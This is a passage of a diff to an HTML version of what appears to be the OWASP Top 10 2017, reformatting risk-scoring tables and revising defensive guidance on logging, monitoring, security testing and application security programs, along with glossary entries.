+<td style="text-align: left;">WIDESPREAD (3)</td>
+<td style="text-align: left;">This issue is widespread, with most applications and APIs containing 200-1000+ dependencies depending on platform.</td>
+</tr>
+<tr class="even">
+<td style="text-align: left;">Detectability</td>
+<td style="text-align: left;">AVERAGE (2)</td>
+<td style="text-align: left;">This issue is not easily detectable. due to backported patches or hidden headers. The best place to detect this issue is using dependency checkers in the CI/CD platform.</td>
+</tr>
+<tr class="odd">
+<td style="text-align: left;">Impact</td>
+<td style="text-align: left;">MODERATE (2)</td>
+<td style="text-align: left;">Some of the largest breaches in history abused this risk, and so depending on the data asset under protection, this might even rise to SEVERE.</td>
+</tr>
+<tr class="even">
+<td style="text-align: left;">Business impacts</td>
+<td style="text-align: left;">?</td>
+<td style="text-align: left;">The business impact is application specific, and depends on the classification and protection needs of your application and data.</td>
+</tr>
+<tr class="odd">
+<td style="text-align: left;">Score</td>
+<td style="text-align: left;">4.7</td>
+<td style="text-align: left;">MEDIUM</td>
 </tr>
 </tbody>
 </table>
@@ -953,37 +1200,57 @@ Note that attackers can also use XSS to defeat any automated CSRF defense the ap
 <li><a href="https://rubysec.com/">Ruby Libraries Security Advisory Database and Tools</a></li>
 </ul>
 <h1 id="a10-insufficient-logging-and-monitoring">A10 Insufficient Logging and Monitoring</h1>
-<table style="width:33%;">
+<table style="width:12%;">
 <colgroup>
-<col style="width: 5%" />
-<col style="width: 5%" />
-<col style="width: 5%" />
-<col style="width: 5%" />
-<col style="width: 5%" />
-<col style="width: 5%" />
+<col style="width: 4%" />
+<col style="width: 4%" />
+<col style="width: 4%" />
 </colgroup>
 <thead>
 <tr class="header">
-<th style="text-align: left;">Threat agents</th>
-<th style="text-align: left;">Exploitability</th>
-<th style="text-align: left;">Prevalance</th>
-<th style="text-align: left;">Detectability</th>
-<th style="text-align: left;">Technical Impact</th>
-<th style="text-align: left;">Business Impacts</th>
+<th style="text-align: left;">Factor</th>
+<th style="text-align: left;">Score</th>
+<th style="text-align: left;">Description</th>
 </tr>
 </thead>
 <tbody>
 <tr class="odd">
-<td style="text-align: left;">App Specific</td>
-<td style="text-align: left;">2</td>
-<td style="text-align: left;">3</td>
-<td style="text-align: left;">1</td>
-<td style="text-align: left;">2</td>
-<td style="text-align: left;">App Specific</td>
+<td style="text-align: left;">Threat agent</td>
+<td style="text-align: left;">?</td>
+<td style="text-align: left;">The threat agent is app specific, and depends on access, motive, and goals against the data asset.</td>
+</tr>
+<tr class="even">
+<td style="text-align: left;">Exploitability</td>
+<td style="text-align: left;">AVERAGE (2)</td>
+<td style="text-align: left;">Exploitation of insufficient logging and monitoring is the bedrock of every major incident. Attackers rely on the lack of monitoring to achieve their goals without being detected.</td>
+</tr>
+<tr class="odd">
+<td style="text-align: left;">Prevalence</td>
+<td style="text-align: left;">WIDESPREAD (3)</td>
+<td style="text-align: left;">There is little data on the prevalence of this issue, and so this issue has been selected by the community.</td>
+</tr>
+<tr class="even">
+<td style="text-align: left;">Detectability</td>
+<td style="text-align: left;">DIFFICULT (1)</td>
+<td style="text-align: left;">This issue is not easily detectable. Generally, dynamic testing would detect active response, such as being blocked. This is often not visible to tools.</td>
+</tr>
+<tr class="odd">
+<td style="text-align: left;">Impact</td>
+<td style="text-align: left;">MODERATE (2)</td>
+<td style="text-align: left;">The impact of this issue is moderate to severe, due to delays in activating incident response, allowing the attacker more time to attack, and impairs understanding of what was disclosed or breached.</td>
+</tr>
+<tr class="even">
+<td style="text-align: left;">Business impacts</td>
+<td style="text-align: left;">?</td>
+<td style="text-align: left;">The business impact is application specific, and depends on the classification and protection needs of your application and data.</td>
+</tr>
+<tr class="odd">
+<td style="text-align: left;">Score</td>
+<td style="text-align: left;">4.0</td>
+<td style="text-align: left;">MEDIUM</td>
 </tr>
 </tbody>
 </table>
-<p>Exploitation of insufficient logging and monitoring is the bedrock of every major incident. Attackers rely on the lack of monitoring to achieve their goals without being detected. There is little data on the prevalence of this issue, and so this issue has been selected by the community. The impact of this issue is moderate to severe, due to delays in activating incident response, allowing the attacker more time to attack, and impairs understanding of what was disclosed or breached.</p>
 <h2 id="am-i-vulnerable-to-attack-9">Am I vulnerable to attack?</h2>
 <p>Insufficient logging and monitoring occurs anytime:</p>
 <ul>
@@ -1000,7 +1267,7 @@ Note that attackers can also use XSS to defeat any automated CSRF defense the ap
 <li>Ensure logs cannot easily be deleted or cleared without authorization</li>
 <li>Establish effective monitoring and alerting, such that suspicious activities such as brute force attacks or business loss are detected and responded within acceptable time periods.</li>
 </ul>
-<p>Large or high performing organizations may wish to invest in log correlation and analysis or security event incident management (SIEM) software or services. Open source and commercial offerings should be considered in light of organizational objectives.</p>
+<p>Large or high performing organizations should have application security incident response plans in place, and tested across web apps and API services, with tooling integrated into processes, people and training. Such organizations may wish to invest in log correlation and analysis or security event incident management (SIEM) software or services. Open source and commercial offerings should be considered in light of organizational objectives and budget.</p>
 <h2 id="example-scenarios-8">Example Scenarios</h2>
 <p>Target, a large US retailer, had an internal malware analysis sandbox analyzing attachments. The sandbox software had detected potentially unwanted software, but no one responded to this detection. By the time the point of sale breach was discovered, the sandbox had been alerting on this issue for over six months. Since this time, Target has invested heavily in security operations, including training, and network and application oversight.</p>
 <p>An open source project forum software run by a small team was hacked using a flaw in its software. The attackers managed to wipe out the internal source code repository containing the next version, and all of the forum contents. Although source could be recovered, the lack of monitoring, logging or alerting led to a far worse breach. The forum software project is no longer active as a result of this issue.</p>
@@ -1035,7 +1302,7 @@ Note that attackers can also use XSS to defeat any automated CSRF defense the ap
 <tbody>
 <tr class="odd">
 <td style="text-align: left;">Application Security Requirements</td>
-<td style="text-align: left;">To produce a secure web application, you must define what secure means for that application. OWASP recommends you use the OWASP Application Security Verification Standard (ASVS), as a guide for setting the security requirements for your application(s). ASVS has been updated significantly in the past few years, with version 3.0.1 being released mid 2016. If you’re outsourcing, consider the OWASP Secure Software Contract Annex.</td>
+<td style="text-align: left;">To produce a secure web application, you must define what secure means for that application. OWASP recommends you use the OWASP Application Security Verification Standard (ASVS), as a guide for setting the security requirements for your application(s). ASVS has been updated significantly in the past few years, with version 3.0.1 being released mid 2016. If you're outsourcing, consider the OWASP Secure Software Contract Annex.</td>
 </tr>
 <tr class="even">
 <td style="text-align: left;">---</td>
@@ -1043,7 +1310,7 @@ Note that attackers can also use XSS to defeat any automated CSRF defense the ap
 </tr>
 <tr class="odd">
 <td style="text-align: left;">Application Security Architecture</td>
-<td style="text-align: left;">Rather than retrofitting security into your applications and APIs, it is far more cost effective to design the security in from the start. OWASP recommends the OWASP Prevention Cheat Sheets and the OWASP Developer’s Guide as good starting points for guidance on how to design security in from the beginning. The Cheat Sheets have been updated and expanded significantly since the 2013 Top 10 was released.</td>
+<td style="text-align: left;">Rather than retrofitting security into your applications and APIs, it is far more cost effective to design the security in from the start. OWASP recommends the OWASP Prevention Cheat Sheets and the OWASP Developer's Guide as good starting points for guidance on how to design security in from the beginning. The Cheat Sheets have been updated and expanded significantly since the 2013 Top 10 was released.</td>
 </tr>
 <tr class="even">
 <td style="text-align: left;">---</td>
@@ -1078,8 +1345,8 @@ Note that attackers can also use XSS to defeat any automated CSRF defense the ap
 <p>There are numerous additional OWASP resources available for your use. Please visit the <a href="https://www.owasp.org/index.php/Projects">OWASP Projects</a> page, which lists all the Flagship, Labs, and Incubator projects in the OWASP project inventory. Most OWASP resources are available on our <a href="https://www.owasp.org/">wiki</a>, and many OWASP documents can be ordered in <a href="http://stores.lulu.com/owasp">hardcopy</a> or as <a href="http://stores.lulu.com/owasp">eBooks</a>.</p>
 <h1 id="t-whats-next-for-security-testing">+T What's Next for Security Testing</h1>
 <h2 id="establish-continuous-application-security-testing">Establish Continuous Application Security Testing</h2>
-<p>Building code securely is important. But it’s critical to verify that the security you intended to build is actually present, correctly implemented, and used everywhere it was supposed to be. The goal of application security testing is to provide this evidence. The work is difficult and complex, and modern high-speed development processes like Agile and DevOps have put extreme pressure on traditional approaches and tools. So we strongly encourage you to put some thought into how you are going to focus on what’s important across your entire application portfolio, and do it cost-effectively.</p>
-<p>Modern risks move quickly, so the days of scanning or penetration testing an application for vulnerabilities once every year or so are long gone. Modern software development requires continuous application security testing across the entire software development lifecycle. Look to enhance existing development pipelines with security automation that doesn’t slow development. Whatever approach you choose, consider the annual cost to test, triage, remediate, retest, and redeploy a single application, multiplied by the size of your application portfolio.</p>
+<p>Building code securely is important. But it's critical to verify that the security you intended to build is actually present, correctly implemented, and used everywhere it was supposed to be. The goal of application security testing is to provide this evidence. The work is difficult and complex, and modern high-speed development processes like Agile and DevOps have put extreme pressure on traditional approaches and tools. So we strongly encourage you to put some thought into how you are going to focus on what's important across your entire application portfolio, and do it cost-effectively.</p>
+<p>Modern risks move quickly, so the days of scanning or penetration testing an application for vulnerabilities once every year or so are long gone. Modern software development requires continuous application security testing across the entire software development lifecycle. Look to enhance existing development pipelines with security automation that doesn't slow development. Whatever approach you choose, consider the annual cost to test, triage, remediate, retest, and redeploy a single application, multiplied by the size of your application portfolio.</p>
 <table style="width:11%;">
 <colgroup>
 <col style="width: 5%" />
@@ -1094,7 +1361,7 @@ Note that attackers can also use XSS to defeat any automated CSRF defense the ap
 <tbody>
 <tr class="odd">
 <td style="text-align: left;">Understand the Threat Model</td>
-<td style="text-align: left;">Before you start testing, be sure you understand what’s important to spend time on. Priorities come from the threat model, so if you don’t have one, you need to create one before testing. Consider using OWASP ASVS and the OWASP Testing Guide as an input and don’t rely on tool vendors to decide what’s important for your business.</td>
+<td style="text-align: left;">Before you start testing, be sure you understand what's important to spend time on. Priorities come from the threat model, so if you don't have one, you need to create one before testing. Consider using OWASP ASVS and the OWASP Testing Guide as an input and don't rely on tool vendors to decide what's important for your business.</td>
 </tr>
 <tr class="even">
 <td style="text-align: left;">Understand Your SDLC</td>
@@ -1106,17 +1373,17 @@ Note that attackers can also use XSS to defeat any automated CSRF defense the ap
 </tr>
 <tr class="even">
 <td style="text-align: left;">Achieving Coverage and Accuracy</td>
-<td style="text-align: left;">You don’t have to start out testing everything. Focus on what’s important and expand your verification program over time. That means expanding the set of security defenses and risks that are being automatically verified, as well as expanding the set of applications and APIs being covered. The goal is to get to where the essential security of all your applications and APIs is verified continuously.</td>
+<td style="text-align: left;">You don't have to start out testing everything. Focus on what's important and expand your verification program over time. That means expanding the set of security defenses and risks that are being automatically verified, as well as expanding the set of applications and APIs being covered. The goal is to get to where the essential security of all your applications and APIs is verified continuously.</td>
 </tr>
 <tr class="odd">
 <td style="text-align: left;">Making Findings Awesome</td>
-<td style="text-align: left;">No matter how good you are at testing, it won’t make any difference unless you communicate it effectively. Build trust by showing you understand how the application works. Describe clearly how it can be abused without “lingo” and include an attack scenario to make it real. Make a realistic estimation of how hard the vulnerability is to discover and exploit, and how bad that would be. Finally, deliver findings in the tools development teams are already using, not PDF files.</td>
+<td style="text-align: left;">No matter how good you are at testing, it won't make any difference unless you communicate it effectively. Build trust by showing you understand how the application works. Describe clearly how it can be abused without &quot;lingo&quot; and include an attack scenario to make it real. Make a realistic estimation of how hard the vulnerability is to discover and exploit, and how bad that would be. Finally, deliver findings in the tools development teams are already using, not PDF files.</td>
 </tr>
 </tbody>
 </table>
 <h1 id="o-whats-next-for-organizations">+O What's Next for Organizations</h1>
 <h2 id="start-your-application-security-program-now">Start Your Application Security Program Now</h2>
-<p>Application security is no longer optional. Between increasing attacks and regulatory pressures, organizations must establish effective processes and capabilities for securing their applications and APIs. Given the staggering amount of code in the numerous applications and APIs already in production, many organizations are struggling to get a handle on the enormous volume of vulnerabilities. OWASP recommends that organizations establish an application security program to gain insight and improve security across their application portfolio. Achieving application security requires many different parts of an organization to work together efficiently, including security and audit, software development, and business and executive management. It requires security to be visible, so that all the different players can see and understand the organization’s application security posture. It also requires focus on the activities and outcomes that actually help improve enterprise security by reducing risk in the most cost effective manner. Some of the key activities in effective application security programs include:</p>
+<p>Application security is no longer optional. Between increasing attacks and regulatory pressures, organizations must establish effective processes and capabilities for securing their applications and APIs. Given the staggering amount of code in the numerous applications and APIs already in production, many organizations are struggling to get a handle on the enormous volume of vulnerabilities. OWASP recommends that organizations establish an application security program to gain insight and improve security across their application portfolio. Achieving application security requires many different parts of an organization to work together efficiently, including security and audit, software development, and business and executive management. It requires security to be visible, so that all the different players can see and understand the organization's application security posture. It also requires focus on the activities and outcomes that actually help improve enterprise security by reducing risk in the most cost effective manner. Some of the key activities in effective application security programs include:</p>
 <h3 id="get-started">Get Started</h3>
 <ul>
 <li>Establish an application security program and drive adoption.</li>
@@ -1203,7 +1470,7 @@ Note that attackers can also use XSS to defeat any automated CSRF defense the ap
 <li><strong>Personally Identifiable Information</strong> (PII) - is information that can be used on its own or with other information to identify, contact, or locate a single person, or to identify an individual in context.</li>
 <li><strong>PIE</strong> – Position-independent executable (PIE) is a body of machine code that, being placed somewhere in the primary memory, executes properly regardless of its absolute address.</li>
 <li><strong>PKI</strong> – A PKI is an arrangement that binds public keys with respective identities of entities. The binding is established through a process of registration and issuance of certificates at and by a certificate authority (CA).</li>
-<li><strong>SAST</strong> – Static application security testing (SAST) is a set of technologies designed to analyze application source code, byte code and binaries for coding and design conditions that are indicative of security vulnerabilities. SAST solutions analyze an application from the “inside out” in a nonrunning state.</li>
+<li><strong>SAST</strong> – Static application security testing (SAST) is a set of technologies designed to analyze application source code, byte code and binaries for coding and design conditions that are indicative of security vulnerabilities. SAST solutions analyze an application from the &quot;inside out&quot; in a nonrunning state.</li>
 <li><strong>SDLC</strong> – Software development lifecycle.</li>
 <li><strong>Security Architecture</strong> – An abstraction of an application's design that identifies and describes where and how security controls are used, and also identifies and describes the location and sensitivity of both user and application data.</li>
 <li><strong>Security Configuration</strong> – The runtime configuration of an application that affects how security controls are used.</li>
